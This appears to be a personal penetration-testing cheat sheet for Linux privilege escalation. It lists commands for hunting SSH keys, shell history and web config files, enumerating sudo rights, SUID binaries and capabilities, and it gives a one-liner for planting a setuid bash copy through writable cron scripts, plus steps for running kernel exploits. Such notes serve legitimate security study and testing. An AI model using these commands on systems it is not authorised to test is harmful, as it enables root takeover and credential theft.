# 3_privilege_escalation

- Check for sensitive files in home directories.

```
find /home/ -name .bash_history 2> /dev/null
find /home/ -name .ssh 2> /dev/null
```

- Check for sensitive files in web server directory.

```
find /var/www/ -name "config.php"
find /var/www/ -name "configuration.php"
find /var/www/ -name "initialize.php"
find /var/www/ -name "*.db"
which mysql
```

- Check for sensitive files in other directories.

```
/home
~
/
```

- Check sudo commands.
You don't always need the user creds to run this escalation!

```shell
sudo -l
```

- Check group memberships.

```shell
id
```

- Check for files owned by a specific user

```shell
find / -user username 2> /dev/null
```

- Check for interesting cronjobs. 

```
cat /etc/crontab
```

A nice one liner to overwrite in scripts is

```shell
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

- Check files that have SUID bits set.

```shell
find / -perm -u=s -type f -ls 2>/dev/null
```

- Check for Linux capabilities

```shell
getcap -r / 2> /dev/null
```

- Check socket statistics for processes exposed on the machine.

```
ss -s -l -n -t -u
```

- Check the environment variables of the shell. 
- Check if there are scripts or commands to are vulnerable to `PATH` manipulation.
- Check for kernel exploits.
  - Determine kernel version using `uname -a`.
  - Search exploit databases for match.
  - Run exploit.
